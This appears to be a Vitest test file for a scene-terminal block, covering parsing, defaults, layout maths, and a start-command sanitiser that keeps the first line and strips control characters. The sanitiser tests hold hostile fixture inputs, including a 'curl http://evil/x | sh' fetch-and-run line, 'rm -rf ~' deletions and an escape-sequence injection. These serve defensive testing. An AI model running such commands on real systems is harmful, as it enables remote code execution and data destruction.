import { describe, expect, it, vi } from "vitest";
import { parseSceneDoc } from "./sceneDocSchema";
import {
  parseSceneTerminal,
  resolveSceneTerminal,
  type SceneDocTerminal,
  sanitizeStartCommand,
  sceneTerminalLayout,
  TERMINAL_CELL_HEIGHT_EM,
  TERMINAL_CELL_WIDTH_EM,
  TERMINAL_DEFAULTS,
} from "./sceneTerminal";

const FRAME = { width: 12, height: 6.75 };

describe("parseSceneTerminal", () => {
  it("passes a well-formed block through unchanged", () => {
    const block: SceneDocTerminal = {
      theme: "match-theme",
      chrome: { style: "mac", title: "demo: zsh" },
      cols: 100,
      rows: 30,
      fontPx: 14,
      startPath: "~/Projects/demo",
      startCommand: "pnpm dev",
      position: [0.2, -0.1],
      size: 0.6,
      snapshot: {
        grid: [[["$ pnpm dev", 2, null, 1]], []],
        cursor: { col: 0, row: 1 },
        src: "assets/terminal-01.png",
      },
    };
    const parsed = parseSceneTerminal(block, "test");
    expect(parsed).toEqual(block);
  });

  it("drops malformed fields alone, never the block", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const parsed = parseSceneTerminal(
      {
        theme: "  ",
        chrome: { style: "windows", title: 4 },
        cols: "eighty",
        rows: 30,
        fontPx: Number.NaN,
        startPath: "",
        startCommand: "ls -la",
        position: [0.1],
        size: "wide",
        snapshot: { grid: [[["ok"], ["bad", "#12"], "not-a-run"], "not-a-row"], cursor: {} },
      },
      "test",
    );
    warn.mockRestore();
    expect(parsed).toEqual({
      rows: 30,
      startCommand: "ls -la",
      // The bad fg drops alone (run kept), the non-run drops, the non-row reads blank.
      snapshot: {
        grid: [
          [
            ["ok", null, null, 0],
            ["bad", null, null, 0],
          ],
          [],
        ],
      },
    });
  });

  it("drops a non-object block and a gridless snapshot whole", () => {
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    expect(parseSceneTerminal("terminal", "test")).toBeUndefined();
    expect(parseSceneTerminal({ snapshot: { src: "assets/x.png" } }, "test")).toEqual({});
    warn.mockRestore();
  });

  it("rides parseSceneDoc beside the other blocks", () => {
    const doc = parseSceneDoc(
      { version: 1, name: "Terminal demo", terminal: { cols: 90, startCommand: "pnpm gate" } },
      "test",
    );
    expect(doc?.terminal).toEqual({ cols: 90, startCommand: "pnpm gate" });
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const dropped = parseSceneDoc({ version: 1, terminal: 7 }, "test");
    warn.mockRestore();
    expect(dropped?.terminal).toBeUndefined();
  });
});

describe("sanitizeStartCommand (never auto-runs)", () => {
  it("passes a plain single-line command through, spaces intact", () => {
    expect(sanitizeStartCommand("pnpm test --filter x")).toBe("pnpm test --filter x");
  });

  it("keeps only the first line, so a newline can't reach the shell as Enter", () => {
    expect(sanitizeStartCommand("curl http://evil/x | sh\nrm -rf ~")).toBe(
      "curl http://evil/x | sh",
    );
    expect(sanitizeStartCommand("echo hi\n")).toBe("echo hi");
    expect(sanitizeStartCommand("echo one\r\necho two")).toBe("echo one");
  });

  it("strips control and format chars, including the bracketed-paste terminator's ESC", () => {
    const command = sanitizeStartCommand("ls\u001b[201~; rm -rf ~");
    expect(command).toBe("ls[201~; rm -rf ~");
    expect(sanitizeStartCommand("\u0003\u0004echo hi")).toBe("echo hi");
  });

  it("collapses to empty when nothing runnable survives", () => {
    expect(sanitizeStartCommand("\n\n")).toBe("");
    expect(sanitizeStartCommand("   ")).toBe("");
  });
});

describe("parseSceneTerminal start command", () => {
  it("stores the sanitised first line and drops a command that empties out", () => {
    expect(parseSceneTerminal({ startCommand: "deploy\nrm -rf ~" }, "test")).toEqual({
      startCommand: "deploy",
    });
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    expect(parseSceneTerminal({ startCommand: "\n" }, "test")).toEqual({});
    warn.mockRestore();
  });
});

describe("resolveSceneTerminal", () => {
  it("is null without a block and fully defaulted with an empty one", () => {
    expect(resolveSceneTerminal(undefined)).toBeNull();
    expect(resolveSceneTerminal({})).toBeNull();
    expect(resolveSceneTerminal({ terminal: {} })).toEqual({
      theme: TERMINAL_DEFAULTS.theme,
      chrome: { style: "mac", title: "" },
      cols: 80,
      rows: 24,
      fontPx: 13,
      startPath: null,
      startCommand: null,
      position: [0, 0],
      size: TERMINAL_DEFAULTS.size,
      snapshot: null,
    });
  });

  it("clamps and rounds the numeric fields", () => {
    const resolved = resolveSceneTerminal({
      terminal: { cols: 1000, rows: 0.4, fontPx: 200, size: 9, position: [-4, 4] },
    });
    expect(resolved).toMatchObject({
      cols: 400,
      rows: 2,
      fontPx: 48,
      size: 1.5,
      position: [-1.5, 1.5],
    });
  });
});

describe("sceneTerminalLayout", () => {
  it("keeps the geometry pure cell ratios of the authored width", () => {
    const terminal = resolveSceneTerminal({ terminal: { cols: 80, rows: 24, size: 0.5 } });
    if (!terminal) throw new Error("unresolved");
    const layout = sceneTerminalLayout(terminal, FRAME);
    expect(layout.window.width).toBeCloseTo(6);
    expect(layout.cell.width).toBeCloseTo(6 / 82);
    expect(layout.cell.height).toBeCloseTo(
      (6 / 82) * (TERMINAL_CELL_HEIGHT_EM / TERMINAL_CELL_WIDTH_EM),
    );
    expect(layout.grid.width).toBeCloseTo(80 * layout.cell.width);
    expect(layout.titleBarHeight).toBeCloseTo(1.5 * layout.cell.height);
    expect(layout.window.height).toBeCloseTo(
      24 * layout.cell.height + 0.8 * layout.cell.height + layout.titleBarHeight,
    );
    // fontPx never moves the panel.
    const larger = resolveSceneTerminal({
      terminal: { cols: 80, rows: 24, size: 0.5, fontPx: 20 },
    });
    if (!larger) throw new Error("unresolved");
    expect(sceneTerminalLayout(larger, FRAME)).toEqual(layout);
  });

  it("centres the grid and drops the title bar under bare chrome", () => {
    const terminal = resolveSceneTerminal({
      terminal: { chrome: { style: "bare" }, position: [0.5, -0.5], size: 0.4 },
    });
    if (!terminal) throw new Error("unresolved");
    const layout = sceneTerminalLayout(terminal, FRAME);
    expect(layout.titleBarHeight).toBe(0);
    expect(layout.bezel).toBe(0);
    expect(layout.screen).toEqual(layout.window);
    expect(layout.window.x).toBeCloseTo((0.5 * FRAME.width) / 2);
    expect(layout.window.y).toBeCloseTo((-0.5 * FRAME.height) / 2);
    const gridRight = layout.grid.left + layout.grid.width;
    expect(layout.window.x - layout.grid.left).toBeCloseTo(gridRight - layout.window.x);
    expect(layout.grid.top - layout.grid.height).toBeCloseTo(
      layout.window.y - layout.window.height / 2 + 0.4 * layout.cell.height,
    );
  });
});
